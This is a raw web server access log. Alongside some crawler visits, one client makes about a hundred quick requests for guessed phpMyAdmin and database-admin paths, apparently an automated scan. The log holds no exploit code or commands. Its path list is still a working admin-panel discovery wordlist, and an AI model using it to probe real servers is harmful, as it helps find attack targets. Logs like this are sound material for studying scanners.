216.244.66.232 - - [29/Nov/2021:21:10:13 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.133.42 - - [29/Nov/2021:21:13:33 +0000] "GET /blog/tags/VxWorks.html HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /PMA2013/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:58 +0000] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:59 +0000] "GET /PMA2018/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:13:59 +0000] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:00 +0000] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:00 +0000] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:00 +0000] "GET /PMA2013/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:00 +0000] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:00 +0000] "GET /sql/sql/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:00 +0000] "GET /database/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /pma2013/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /admin/pMA/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:01 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:02 +0000] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:02 +0000] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:02 +0000] "GET /phpMyAdmin-5.1.1-english/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:02 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:02 +0000] "GET /PMA2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:02 +0000] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:02 +0000] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /PMA2012/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /PMA2012/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:03 +0000] "GET /pma2015/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /PMA2018/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /PMA2017/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:04 +0000] "GET /PMA2013/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:05 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:05 +0000] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:05 +0000] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:05 +0000] "GET /administrator/db/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:05 +0000] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:05 +0000] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:05 +0000] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:06 +0000] "GET /PMA2015/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:06 +0000] "GET /admin/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:06 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:06 +0000] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:06 +0000] "GET /PMA/index.php?lang=en HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:06 +0000] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:06 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:07 +0000] "GET /pma2016/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:07 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:07 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:07 +0000] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:07 +0000] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:07 +0000] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:07 +0000] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:08 +0000] "GET /admin/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /PMA2012/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:09 +0000] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:10 +0000] "GET /database/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:10 +0000] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:10 +0000] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:10 +0000] "GET /PMA2016/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:10 +0000] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:10 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:10 +0000] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:11 +0000] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:11 +0000] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:11 +0000] "GET /pma2014/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:11 +0000] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:11 +0000] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:11 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:11 +0000] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:12 +0000] "GET /PMA2013/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:12 +0000] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:12 +0000] "GET /PMA/index.php?lang=en HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:12 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:12 +0000] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:12 +0000] "GET /db/index.php?lang=en HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:12 +0000] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:13 +0000] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:13 +0000] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:13 +0000] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
35.217.2.160 - - [29/Nov/2021:21:14:13 +0000] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
